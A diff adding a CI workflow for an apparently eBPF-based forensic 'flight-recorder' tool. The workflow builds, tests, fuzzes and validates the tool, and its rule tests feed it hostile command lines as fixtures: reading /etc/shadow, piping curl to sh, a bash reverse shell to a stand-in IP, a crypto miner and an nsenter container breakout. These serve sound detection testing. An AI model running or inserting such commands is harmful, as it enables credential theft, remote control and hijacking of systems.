@@ -1,0 +1,375 @@
+name: build
+
+on:
+  push:
+    branches: [main]
+  pull_request:
+    branches: [main]
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+env:
+  GO_VERSION: "1.24"
+
+jobs:
+  # ---------------------------------------------------------------------------
+  # Static analysis and unit tests
+  # ---------------------------------------------------------------------------
+  test:
+    name: test (unit)
+    runs-on: ubuntu-24.04
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-go@v5
+        with:
+          go-version: ${{ env.GO_VERSION }}
+          cache: true
+
+      - name: Verify formatting
+        run: |
+          unformatted=$(gofmt -l ./cmd ./pkg ./test)
+          if [ -n "$unformatted" ]; then
+            echo "these files are not gofmt-clean:"
+            echo "$unformatted"
+            exit 1
+          fi
+
+      - name: Verify the module graph is tidy
+        run: |
+          go mod tidy
+          git diff --exit-code go.mod go.sum
+
+      - name: go vet (amd64 and arm64)
+        run: |
+          go vet ./...
+          GOOS=linux GOARCH=arm64 go vet ./...
+
+      - name: Unit tests with the race detector
+        run: go test -race -count=1 -coverprofile=coverage.out -covermode=atomic ./pkg/...
+
+      - name: Coverage summary
+        run: go tool cover -func=coverage.out | tail -20
+
+      - uses: actions/upload-artifact@v4
+        with:
+          name: coverage
+          path: coverage.out
+
+  # ---------------------------------------------------------------------------
+  # The /proc/[pid]/maps parser takes attacker-influenced input, so it gets a
+  # fuzzing pass on every change rather than only in a nightly job.
+  # ---------------------------------------------------------------------------
+  fuzz:
+    name: fuzz (procmaps parser)
+    runs-on: ubuntu-24.04
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-go@v5
+        with:
+          go-version: ${{ env.GO_VERSION }}
+          cache: true
+      - name: Fuzz the maps parser
+        run: go test -run=XXX -fuzz=FuzzParseProcMaps -fuzztime=60s ./pkg/capture/
+      - name: Upload any crashers
+        if: failure()
+        uses: actions/upload-artifact@v4
+        with:
+          name: fuzz-crashers
+          path: pkg/capture/testdata/fuzz/
+
+  # ---------------------------------------------------------------------------
+  # Lint
+  # ---------------------------------------------------------------------------
+  lint:
+    name: lint
+    runs-on: ubuntu-24.04
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-go@v5
+        with:
+          go-version: ${{ env.GO_VERSION }}
+          cache: true
+      - uses: golangci/golangci-lint-action@v6
+        with:
+          version: latest
+          args: --timeout=5m
+
+  # ---------------------------------------------------------------------------
+  # eBPF: the committed object must reproduce from the committed C source.
+  # ---------------------------------------------------------------------------
+  ebpf:
+    name: ebpf (compile + regenerate)
+    runs-on: ubuntu-24.04
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-go@v5
+        with:
+          go-version: ${{ env.GO_VERSION }}
+          cache: true
+
+      - name: Install the eBPF toolchain
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y --no-install-recommends clang llvm libbpf-dev
+          clang --version
+
+      - name: Compile the eBPF object
+        run: |
+          clang -target bpf -O2 -g -Wall -Werror -D__TARGET_ARCH_x86 \
+            -I bpf -I bpf/include -c bpf/recorder.c -o /tmp/recorder.o
+          file /tmp/recorder.o
+          llvm-objdump -h /tmp/recorder.o | head -30
+
+      - name: Regenerate the Go bindings
+        run: |
+          BPF_CLANG=clang \
+          BPF_CFLAGS="-O2 -g -Wall -Werror -D__TARGET_ARCH_x86" \
+          go generate ./pkg/probe/...
+
+      - name: The regenerated bindings must still compile and pass their tests
+        run: |
+          go build ./...
+          go test -count=1 ./pkg/probe/...
+
+      - name: Verify the vendored vmlinux.h is a real BTF dump
+        run: |
+          test -s bpf/vmlinux.h
+          size=$(wc -c < bpf/vmlinux.h)
+          echo "vmlinux.h is $size bytes"
+          if [ "$size" -lt 1000000 ]; then
+            echo "error: vmlinux.h looks truncated (expected > 1 MB)"
+            exit 1
+          fi
+          grep -q "struct task_struct" bpf/vmlinux.h
+          grep -q "struct trace_event_raw_sys_enter" bpf/vmlinux.h
+
+  # ---------------------------------------------------------------------------
+  # Multi-architecture build
+  # ---------------------------------------------------------------------------
+  build:
+    name: build (${{ matrix.arch }})
+    runs-on: ubuntu-24.04
+    needs: [test]
+    strategy:
+      fail-fast: false
+      matrix:
+        arch: [amd64, arm64]
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+
+      - uses: actions/setup-go@v5
+        with:
+          go-version: ${{ env.GO_VERSION }}
+          cache: true
+
+      - name: Install the eBPF toolchain
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y --no-install-recommends clang llvm libbpf-dev
+
+      - name: Generate eBPF bindings
+        run: |
+          BPF_CLANG=clang \
+          BPF_CFLAGS="-O2 -g -Wall -Werror -D__TARGET_ARCH_x86" \
+          go generate ./pkg/probe/...
+
+      - name: Build
+        env:
+          GOOS: linux
+          GOARCH: ${{ matrix.arch }}
+          CGO_ENABLED: "0"
+        run: |
+          VERSION=$(git describe --tags --always --dirty 2>/dev/null || echo "0.1.0-dev")
+          COMMIT=$(git rev-parse --short HEAD)
+          BUILD_DATE=$(date -u +%Y-%m-%dT%H:%M:%SZ)
+          MODULE=github.com/Unspekable1654/flight-recorder
+          go build -trimpath -ldflags "-s -w \
+            -X ${MODULE}/pkg/version.Version=${VERSION} \
+            -X ${MODULE}/pkg/version.Commit=${COMMIT} \
+            -X ${MODULE}/pkg/version.BuildDate=${BUILD_DATE}" \
+            -o flight-recorder-linux-${{ matrix.arch }} ./cmd/flight-recorder
+          ls -la flight-recorder-linux-${{ matrix.arch }}
+
+      - name: Smoke test the native binary
+        if: matrix.arch == 'amd64'
+        run: |
+          ./flight-recorder-linux-amd64 version
+          ./flight-recorder-linux-amd64 rules default | head -20
+          ./flight-recorder-linux-amd64 rules test --cmdline "/usr/bin/cat /etc/shadow"
+          # The full evidence pipeline, with no kernel and no privileges.
+          ./flight-recorder-linux-amd64 demo --output "${RUNNER_TEMP}/demo"
+
+      - uses: actions/upload-artifact@v4
+        with:
+          name: flight-recorder-linux-${{ matrix.arch }}
+          path: flight-recorder-linux-${{ matrix.arch }}
+          retention-days: 14
+
+  # ---------------------------------------------------------------------------
+  # Integration: real kernel, real eBPF, real process_vm_readv.
+  # ---------------------------------------------------------------------------
+  integration:
+    name: integration (privileged)
+    runs-on: ubuntu-24.04
+    needs: [test]
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-go@v5
+        with:
+          go-version: ${{ env.GO_VERSION }}
+          cache: true
+
+      - name: Install the eBPF toolchain
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y --no-install-recommends clang llvm libbpf-dev
+
+      - name: Kernel preflight
+        id: preflight
+        run: |
+          uname -r
+          if [ -r /sys/kernel/btf/vmlinux ]; then
+            echo "btf=yes" >> "$GITHUB_OUTPUT"
+            ls -la /sys/kernel/btf/vmlinux
+          else
+            echo "btf=no" >> "$GITHUB_OUTPUT"
+            echo "::warning::this runner kernel exposes no BTF; CO-RE probes cannot load and integration tests will be skipped"
+          fi
+
+      - name: Generate eBPF bindings
+        run: |
+          BPF_CLANG=clang \
+          BPF_CFLAGS="-O2 -g -Wall -Werror -D__TARGET_ARCH_x86" \
+          go generate ./pkg/probe/...
+
+      - name: Integration tests
+        if: steps.preflight.outputs.btf == 'yes'
+        run: |
+          go build -o /tmp/fr ./cmd/flight-recorder
+          sudo -E env "PATH=$PATH" go test -tags=integration -v -timeout 15m ./test/integration/...
+
+      - name: Live capture against a real process
+        if: steps.preflight.outputs.btf == 'yes'
+        run: |
+          # Hold a known secret in a live process, capture it, and prove the
+          # secret is recoverable from the sealed bundle.
+          sudo -E env "PATH=$PATH" /tmp/fr keygen --key "${RUNNER_TEMP}/key.pem" --pub "${RUNNER_TEMP}/pub.pem"
+
+          /bin/sh -c 'SECRET=CI_LIVE_CAPTURE_MARKER; export SECRET; sleep 60' &
+          TARGET=$!
+          sleep 1
+
+          sudo -E env "PATH=$PATH" /tmp/fr capture \
+            --pid "$TARGET" \
+            --output "${RUNNER_TEMP}/evidence" \
+            --key "${RUNNER_TEMP}/key.pem"
+
+          CASE=$(sudo ls "${RUNNER_TEMP}/evidence" | head -1)
+          echo "captured case $CASE"
+
+          sudo -E env "PATH=$PATH" /tmp/fr verify \
+            --bundle "${RUNNER_TEMP}/evidence/${CASE}" \
+            --key "${RUNNER_TEMP}/key.pem"
+
+          sudo -E env "PATH=$PATH" /tmp/fr inspect \
+            --bundle "${RUNNER_TEMP}/evidence/${CASE}"
+
+          # Decrypt and confirm the marker survived acquisition and sealing.
+          sudo -E env "PATH=$PATH" /tmp/fr decrypt \
+            --bundle "${RUNNER_TEMP}/evidence/${CASE}" \
+            --key "${RUNNER_TEMP}/key.pem" \
+            --out "${RUNNER_TEMP}/dump.bin"
+          sudo grep -q "CI_LIVE_CAPTURE_MARKER" "${RUNNER_TEMP}/dump.bin"
+          echo "the marker was recovered from the sealed evidence"
+
+          kill "$TARGET" || true
+
+  # ---------------------------------------------------------------------------
+  # Deployment manifests
+  # ---------------------------------------------------------------------------
+  manifests:
+    name: manifests
+    runs-on: ubuntu-24.04
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-go@v5
+        with:
+          go-version: ${{ env.GO_VERSION }}
+          cache: true
+
+      - name: Validate the shipped trigger ruleset
+        run: |
+          go run ./cmd/flight-recorder rules default > /tmp/default-triggers.yaml
+          go run ./cmd/flight-recorder rules validate --config /tmp/default-triggers.yaml
+          # The ConfigMap's embedded ruleset must also be valid.
+          python3 - <<'PY'
+          import yaml, sys
+          doc = yaml.safe_load(open('deploy/k8s/configmap.yaml'))
+          open('/tmp/configmap-triggers.yaml', 'w').write(doc['data']['triggers.yaml'])
+          PY
+          go run ./cmd/flight-recorder rules validate --config /tmp/configmap-triggers.yaml
+
+      - name: Every default rule must match its scenario
+        run: |
+          set -e
+          check() { go run ./cmd/flight-recorder rules test --cmdline "$1" | grep -q "matched rule:  $2" || { echo "FAIL: $1 did not match $2"; exit 1; }; }
+          check "/usr/bin/cat /etc/shadow" shadow_access
+          check "/bin/sh -c curl -s http://198.51.100.9/p.sh | sh" curl_pipe_sh
+          check "/bin/bash -i >& /dev/tcp/203.0.113.5/4444 0>&1" reverse_shell
+          check "/tmp/.x/xmrig -o stratum+tcp://pool.example:4444" crypto_miner
+          check "/usr/bin/nsenter --target 1 --mount /bin/sh" container_breakout
+          echo "every shipped rule matches its scenario"
+
+      - name: Validate Kubernetes manifests
+        run: |
+          curl -sSLo /tmp/kubeconform.tar.gz \
+            https://github.com/yannh/kubeconform/releases/download/v0.6.7/kubeconform-linux-amd64.tar.gz
+          tar xzf /tmp/kubeconform.tar.gz -C /tmp
+          /tmp/kubeconform -strict -summary -ignore-missing-schemas deploy/k8s/ test/scenarios/
+
+      - name: Lint and render the Helm chart
+        run: |
+          curl -sSL https://raw.githubusercontent.com/helm/helm/main/scripts/get-helm-3 | bash
+          helm lint deploy/helm/flight-recorder
+          helm template flight-recorder deploy/helm/flight-recorder --namespace flight-recorder > /tmp/rendered.yaml
+          /tmp/kubeconform -strict -summary -ignore-missing-schemas /tmp/rendered.yaml
+          # The rendered DaemonSet must keep the properties the tool depends on.
+          grep -q "hostPID: true" /tmp/rendered.yaml
+          grep -q "SYS_PTRACE" /tmp/rendered.yaml
+          grep -q "readOnlyRootFilesystem: true" /tmp/rendered.yaml
+          grep -q 'privileged: false' /tmp/rendered.yaml
+
+  # ---------------------------------------------------------------------------
+  # Container image (built on every change, pushed only on release)
+  # ---------------------------------------------------------------------------
+  image:
+    name: container image
+    runs-on: ubuntu-24.04
+    needs: [test]
+    steps:
+      - uses: actions/checkout@v4
+      - uses: docker/setup-buildx-action@v3
+      - name: Build
+        uses: docker/build-push-action@v6
+        with:
+          context: .
+          push: false
+          load: true
+          tags: flight-recorder:ci
+          build-args: |
+            VERSION=ci
+            COMMIT=${{ github.sha }}
+          cache-from: type=gha
+          cache-to: type=gha,mode=max
+      - name: The image must be able to start
+        run: |
+          docker run --rm flight-recorder:ci version
+          docker run --rm flight-recorder:ci rules default | head -5
